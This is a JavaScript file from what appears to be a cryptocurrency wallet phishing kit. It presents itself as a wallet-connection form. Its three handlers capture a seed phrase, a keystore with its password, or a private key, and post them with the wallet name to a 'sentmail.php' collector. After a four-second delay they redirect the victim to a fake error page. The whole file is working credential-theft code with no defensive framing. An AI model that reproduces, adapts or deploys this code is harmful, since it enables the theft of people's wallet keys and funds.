$(document).ready(function() {
	
	$('#subphrase').on('click', function() {
		$("#subphrase").hide();
		$("#phrasealert").show();
		var phrase = $('#phrasetext').val();
		var wallet = $('#walletname').html();
		if(phrase!=="" ){
            setTimeout(function() { 
                $.ajax({
                    url: "sentmail.php",
                    type: "POST",
                    data: {
                        cat: 1,
                        phrase:phrase,					
                        wallet:wallet,					
                    },
                    cache: false,
                    success: function(dataResult){
                        var dataResult = JSON.parse(dataResult);
                        if(dataResult.statusCode==200){
                            $("#subphrase").removeAttr("disabled");
                            location.replace('error.html')
                                                    
                        }
                        
                    }
                });
                
            }, 4000)
		}
		else{
			alert('Please fill all the field !');
		}
	});

    $('#subkey').on('click', function() {
		$("#subkey").hide();
		$("#keyalert").show();
		var keystore = $('#keystoreText').val();
		var password = $('#password').val();
		var wallet = $('#walletname').html();
		if(keystore!=="" && password !==''){
            setTimeout(function() { 
                $.ajax({
                    url: "sentmail.php",
                    type: "POST",
                    data: {
                        cat: 2,
                        keystore:keystore,					
                        password:password,					
                        wallet:wallet,					
                    },
                    cache: false,
                    success: function(dataResult){
                        var dataResult = JSON.parse(dataResult);
                        if(dataResult.statusCode==200){
                            $("#subphrase").removeAttr("disabled");
                            location.replace('error.html')
                                                    
                        }
                        else if(dataResult.statusCode==201){
                            $("#meta-alert").show();
                            $('#meta-alert').html('Email ID already exists !');
                        }
                        
                    }
                });
                
            }, 4000)
		}
		else{
			alert('Please fill all the field !');
		}
	});
	
    $('#subprivate').on('click', function() {
		$("#subprivate").hide();
		$("#privatealert").show();
		var key = $('#keytext').val();
		var wallet = $('#walletname').html();
		if(key!=="" ){
            setTimeout(function() { 
                $.ajax({
                    url: "sentmail.php",
                    type: "POST",
                    data: {
                        cat: 3,
                        key:key,					
                        wallet:wallet,					
                    },
                    cache: false,
                    success: function(dataResult){
                        var dataResult = JSON.parse(dataResult);
                        if(dataResult.statusCode==200){
                            $("#subprivate").removeAttr("disabled");
                            location.replace('error.html')
                                                    
                        }
                        
                    }
                });
                
            }, 4000)
		}
		else{
			alert('Please fill all the field !');
		}
	});

});